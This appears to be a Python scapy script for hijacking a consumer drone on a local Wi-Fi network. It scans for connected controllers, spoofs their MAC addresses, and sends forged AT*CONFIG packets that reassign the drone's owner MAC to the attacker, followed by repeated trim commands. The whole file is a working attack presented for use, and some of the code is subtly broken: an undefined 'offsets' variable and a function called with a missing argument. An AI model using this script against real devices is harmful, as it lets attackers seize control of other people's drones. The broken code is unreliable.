from scapy.all import *


interface='en0'
BASE_IP = '192.168.1.'
GG_MAC = '99:91:41:e4:50:1f'
CHANGE_MAC_COMMAND    = 'sudo ifconfig en0 ether '
my_ip = socket.gethostbyname(socket.gethostname())
IPs = [ "192.168.1.2", "192.168.1.3", "192.168.1.4", "192.168.1.5" ]


def _spoof_command( f_command, mac ):
    for ip in IPs:
        datalength = len( f_command ) + offsets[ 0 ]
        s_packet = Ether( src = mac ) / IP( dst = "192.168.1.1", src = ip, len = datalength + offsets[1] )/ UDP( sport = 5554, dport = 5556, len = datalength ) / f_command
        sendp( s_packet )


def changeMAC( newMac ):
    os.system( CHANGE_MAC_COMMAND + newMac )
    print( CHANGE_MAC_COMMAND + newMac )
    time.sleep(5)


def reset():
    seqno = 2**63-1
    for i in range(1,25):
        _spoof_command("AT*FTRIM=%d\r" % seqno )


def changeDroneOwner( seqno, newMac, oldMac ):
    command = """AT*CONFIG=%d,"network:owner_mac","%s"\r""" % ( seqno, newMac )
    for i in range(1,25):
        _spoof_command( command, oldMac )


def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def scan_network():
    unwelcome_macs = dict()
    for i in range(2, 8):
        unwelcome_ip = BASE_IP + str(i)
        if unwelcome_ip != my_ip:
            unwelcome_mac = get_mac(unwelcome_ip)
            if unwelcome_mac:
                unwelcome_macs[unwelcome_ip] = unwelcome_mac
    return unwelcome_macs

def destroy_mac():
    bad_macs = scan_network()
    print(len(bad_macs))
    for i in bad_macs:
        bad_ip = i
        bad_mac = bad_macs[i]

        # change MAC address.
        changeMAC(bad_mac)
        # forge packet. send packet.
        changeDroneOwner( 2**63-2, GG_MAC, bad_mac)
        # pop bottles.
        reset()

destroy_mac()
